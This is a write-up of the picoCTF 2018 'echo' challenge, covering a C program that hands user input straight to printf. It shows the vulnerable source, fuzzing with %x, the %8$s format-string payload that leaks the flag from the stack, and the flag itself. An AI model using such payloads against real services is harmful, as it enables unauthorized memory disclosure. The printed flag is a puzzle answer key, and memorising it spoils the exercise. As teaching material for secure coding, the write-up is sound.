# Problem
This program prints any input you give it. Can you [leak](https://2018shell1.picoctf.com/static/ef78275d00e7ab2809e43a6aa9563317/echo) the flag? Connect with ```nc 2018shell1.picoctf.com 34802```. [Source](https://2018shell1.picoctf.com/static/ef78275d00e7ab2809e43a6aa9563317/echo.c).

## Hints:
If only the program used puts...

## Solution:

Lets download the files:
```bash
wget https://2018shell1.picoctf.com/static/ef78275d00e7ab2809e43a6aa9563317/echo
wget https://2018shell1.picoctf.com/static/ef78275d00e7ab2809e43a6aa9563317/echo.c
```

First, we investigate the source
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  char buf[64];
  char flag[64];
  char *flag_ptr = flag;
  
  // Set the gid to the effective gid
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  memset(buf, 0, sizeof(flag));
  memset(buf, 0, sizeof(buf));

  puts("Time to learn about Format Strings!");
  puts("We will evaluate any format string you give us with printf().");
  puts("See if you can get the flag!");
  
  FILE *file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  
  fgets(flag, sizeof(flag), file);
  
  while(1) {
    printf("> ");
    fgets(buf, sizeof(buf), stdin);
    printf(buf);
  }  
  return 0;
}
```

This program first zeros the buffers, and then there is an infinite loop which reads ```buffer``` from stdin and prints it (as a format string!)

Lets fuzz:
```bash
nc 2018shell1.picoctf.com 34802

Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
> %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
40 f7f225c0 8048647 f7f6b409 f63d4e2e f7f89af8 ff85f584 ff85f48c 3e8 882c160 25207825 78252078 20782520 25207825 78252078
```

We can see that the 8th argument is a pointer to the stack, it may be ```flag_ptr```, lets try to print it:
```bash
nc 2018shell1.picoctf.com 34802

Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
> %8$s
picoCTF{foRm4t_stRinGs_aRe_DanGer0us_3f8bced3}
```

Nice.

Flag: picoCTF{foRm4t_stRinGs_aRe_DanGer0us_3f8bced3}